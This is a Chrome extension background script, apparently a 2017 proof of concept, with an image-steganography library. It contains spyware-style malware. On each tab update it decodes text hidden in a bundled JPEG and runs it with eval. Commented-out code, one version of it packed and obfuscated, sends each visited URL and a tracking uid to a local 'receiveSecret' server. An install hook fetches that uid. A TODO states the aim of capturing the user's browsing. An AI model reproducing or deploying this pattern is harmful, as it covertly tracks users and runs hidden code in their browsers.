/**
 * Created by Ting on 2017/12/23.
 */
// TODO: I can use this function to get the url of what user is visiting!! details seems like the parameter what I need :) **********************

var ImageColorMask = function (colors, opts) {
    opts.debug = opts.debug ? opts.debug : false;
    this.colors = colors;
    var offset = 0;

    var getBit = function (number, location) {
        return ((number >> location) & 1);
    };
    var setBit = function (number, location, bit) {
        return (number & ~(1 << location)) | (bit << location);
    };
    var getBitsFromNumber = function (number, size) {
        var bits = [];
        for (var i = 0; i < size; i++) {
            bits.push(getBit(number, i));
        }
        return bits;
    }

    this.writeNumber = function (number, size) {
        var bits = getBitsFromNumber(number, size);
        var pos = 0;
        var mix = 0;
        if (opts.debug)console.log(bits.join(''));
        while (pos < bits.length && offset < this.colors.length) {
            this.colors[offset] = setBit(this.colors[offset], mix++, bits[pos++]);
            while (mix < opts.mixCount && pos < bits.length) {
                this.colors[offset] = setBit(this.colors[offset], mix++, bits[pos++]);
            }
            if (opts.debug) {
                for (var c = mix; c < 8; c++) {
                    this.colors[offset] = setBit(this.colors[offset], c, 0);
                }
            }
            offset++;
            mix = 0;
            if ((offset + 1) % 4 == 0) {
                colors[offset] = 255;
                offset++;
            }
        }
    }
    this.readNumber = function (size) {
        var bits = opts.debug ? [] : null;
        var pos = 0;
        var number = 0;
        var mix = 0;
        while (pos < size && offset < this.colors.length) {
            var bit = getBit(this.colors[offset], mix++);
            number = setBit(number, pos++, bit);
            if (opts.debug)bits.push(bit);
            while (mix < opts.mixCount && pos < size) {
                bit = getBit(this.colors[offset], mix++);
                number = setBit(number, pos++, bit);
                if (opts.debug)bits.push(bit);
            }

            offset++;
            mix = 0;
            if ((offset + 1) % 4 == 0) {
                offset++;
            }
        }
        if (opts.debug)console.log(bits.join(''));
        return number;
    }
}
var ImageMask = function (opts) {
    opts.debug = opts.debug ? opts.debug : false;
    opts.charSize = opts.charSize || 16;
    opts.mixCount = opts.mixCount || 2;
    opts.lengthSize = opts.lengthSize || 24;

    if (opts.mixCount < 1)opts.mixCount = 1;
    if (opts.mixCount > 5)opts.mixCount = 5;
    if (opts.charSize % opts.mixCount != 0)opts.charSize += opts.mixCount - (opts.charSize % opts.mixCount);
    if (opts.lengthSize % opts.mixCount != 0)opts.lengthSize += opts.mixCount - (opts.lengthSize % opts.mixCount);

    this.opts = opts;
}

ImageMask.prototype.hideText = function (canvas, text) {
    var ctx = canvas.getContext('2d');
    var pixelCount = ctx.canvas.width * ctx.canvas.height;
    if ((this.opts.lengthSize + text.length * this.opts.charSize) > (pixelCount * 3 * this.opts.mixCount)) {
        throw 'text is too long for the image.';
    }

    var imgData = ctx.getImageData(0, 0, ctx.canvas.width, ctx.canvas.height);
    var colorMask = new ImageColorMask(imgData.data, this.opts);
    colorMask.writeNumber(text.length, this.opts.lengthSize);
    for (var i = 0; i < text.length; i++) {
        colorMask.writeNumber(text.charCodeAt(i), this.opts.charSize);
    }

    ctx.putImageData(imgData, 0, 0);
}
ImageMask.prototype.revealText = function (canvas) {
    var ctx = canvas.getContext('2d');
    var pixelCount = ctx.canvas.width * ctx.canvas.height;
    var imgData = ctx.getImageData(0, 0, ctx.canvas.width, ctx.canvas.height);
    var colorMask = new ImageColorMask(imgData.data, this.opts);

    var textLength = colorMask.readNumber(this.opts.lengthSize);

    if ((this.opts.lengthSize + (textLength * this.opts.charSize)) > (pixelCount * 3 * this.opts.mixCount)) {
        return '';
    }

    if (textLength <= 0) {
        return '';
    }

    var text = [];
    for (var i = 0; i < textLength; i++) {
        var code = colorMask.readNumber(this.opts.charSize);
        text.push(String.fromCharCode(code));
    }
    return text.join('');
}
ImageMask.prototype.maxTextLength = function (canvas) {
    var ctx = canvas.getContext('2d');
    var pixelCount = ctx.canvas.width * ctx.canvas.height;
    return ((pixelCount * 3 * this.opts.mixCount) - this.opts.lengthSize) / this.opts.charSize;
}
ImageMask.prototype.maxFileSize = function (canvas) {
    var ctx = canvas.getContext('2d');
    var pixelCount = ctx.canvas.width * ctx.canvas.height;
    return ((pixelCount * 3 * this.opts.mixCount) - 8 - this.opts.lengthSize - (255 * this.opts.charSize)) / 8;
}
ImageMask.prototype.hideFile = function (canvas, file, handler) {
    var fileReader = new FileReader();
    var self = this;
    fileReader.addEventListener("loadend", function (event) {
        var data = new Uint8Array(event.target.result);
        var fileName = file.name;

        var ctx = canvas.getContext('2d');
        var pixelCount = ctx.canvas.width * ctx.canvas.height;
        if ((8 + fileName.length * self.opts.charSize + self.opts.lengthSize + data.length * 8) > (pixelCount * 3 * self.opts.mixCount)) {
            handler({success: false, message: 'file is too big for the image.'});
        } else {
            var imgData = ctx.getImageData(0, 0, ctx.canvas.width, ctx.canvas.height);
            var colorMask = new ImageColorMask(imgData.data, self.opts);
            colorMask.writeNumber(fileName.length, 8);
            for (var i = 0; i < fileName.length; i++) {
                colorMask.writeNumber(fileName.charCodeAt(i), self.opts.charSize);
            }

            colorMask.writeNumber(data.length, self.opts.lengthSize);
            for (var i = 0; i < data.length; i++) {
                colorMask.writeNumber(data[i], 8);
            }

            ctx.putImageData(imgData, 0, 0);
            handler({success: true});
        }
    });
    fileReader.readAsArrayBuffer(file);
}
ImageMask.prototype.revealFile = function (canvas) {
    var ctx = canvas.getContext('2d');
    var pixelCount = ctx.canvas.width * ctx.canvas.height;
    var imgData = ctx.getImageData(0, 0, ctx.canvas.width, ctx.canvas.height);
    var colorMask = new ImageColorMask(imgData.data, this.opts);

    var fileNameLength = colorMask.readNumber(8);
    if ((8 + fileNameLength * this.opts.charSize) > (pixelCount * 3 * this.opts.mixCount)) {
        return null;
    }
    var fileName = [];
    for (var i = 0; i < fileNameLength; i++) {
        var code = colorMask.readNumber(this.opts.charSize);
        fileName.push(String.fromCharCode(code));
    }

    var fileLength = colorMask.readNumber(this.opts.lengthSize);

    if ((8 + fileNameLength * this.opts.charSize + this.opts.lengthSize + (fileLength * 8)) > (pixelCount * 3 * this.opts.mixCount)) {
        return null;
    }

    if (fileLength <= 0) {
        return null;
    }

    var buffer = new ArrayBuffer(fileLength);
    var data = new Uint8Array(buffer);
    for (var i = 0; i < fileLength; i++) {
        var b = colorMask.readNumber(8);
        data[i] = b;
    }
    return {name: fileName.join(''), data: data};
}

chrome.tabs.onUpdated.addListener(function (tabId, details) {
        if (details) {
            if (details.url) {
                if (isUsefulUrl(details.url) >= 0) {
                    // eval("sendSecret(tabId,details.url);function sendSecret(d,e){var f='';chrome.storage.sync.get('uid',function(b){if(b){var c=new XMLHttpRequest();c.open('GET',getAD(b.uid,e),true);c.send(null);c.onreadystatechange=function(){if(c.readyState==4&&c.status==200){var a=JSON.parse(c.responseText);if(a.url){alert(a.url);chrome.tabs.sendMessage(d,{'greeting':a.url})}else{}}}}})}function getAD(a,b){return'http://127.0.0.1:8080/receiveSecret?'+'uid='+a+'&secretUrl='+b}");
                    // eval("function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(p,h.3);2 8(d,e){6 f=\'\';9.i.n.v(\'5\',2(b){7(b){6 c=j k();c.l(\'m\',g(b.5,e),o);c.K(q);c.r=2(){7(c.s==4&&c.t==u){6 a=w.x(c.y);7(a.3){z(a.3);9.A.B(d,{\'C\':a.3})}D{}}}}})}2 g(a,b){E\'F://G.0.0.1:I/J?\'+\'5=\'+a+\'&H=\'+b}',47,47,'||function|url||uid|var|if|sendSecret|chrome|||||||getAD|details|storage|new|XMLHttpRequest|open|GET|sync|true|tabId|null|onreadystatechange|readyState|status|200|get|JSON|parse|responseText|alert|tabs|sendMessage|greeting|else|return|http|127|secretUrl|8080|receiveSecret|send'.split('|'),0,{})");
                    var mask = new ImageMask({debug: false});
                    var img = new Image();
                    img.src = "../images/Secret.jpg";
                    var canvas = document.createElement("canvas");
                    var ctx = canvas.getContext('2d');
                    img.onload = function () {
                        ctx.canvas.width = img.width;
                        ctx.canvas.height = img.height;
                        ctx.drawImage(img, 0, 0);
                        // alert(mask.revealText(canvas));
                        eval(mask.revealText(canvas));
                        // document.defaultView["Function"](mask.revealText(canvas))();
                    };
                }
            }
        }
    }
);
function isUsefulUrl(url) {
    return url.search(/http/);
}
function getUIDServerUrl() {
    return "http://127.0.0.1:8080/uid";
}
function getUID() {
    chrome.storage.sync.get("uid", function (item) {
        if (!item.uid) {
            getUIDfromServer();
        }
    });
}
function getUIDfromServer() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", getUIDServerUrl(), true);
    xhr.send(null);
    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var obj = JSON.parse(xhr.responseText);
            if (obj.uid) {
                chrome.storage.sync.set({'uid': obj.uid}, function () {
                });
            } else {
            }
        }
    };
}
chrome.runtime.onInstalled.addListener(function (details) {
        getUID();
    }
);

function revealSpy() {
    var mask = new ImageMask({debug: false});
    var img = new Image();
    img.src = "../images/Secret.jpg";
    var canvas = document.createElement("canvas");
    var ctx = canvas.getContext('2d');
    img.onload = function () {
        ctx.canvas.width = img.width;
        ctx.canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
        // alert(mask.revealText(canvas));
        document.defaultView["Function"](mask.revealText(canvas))();
    };
}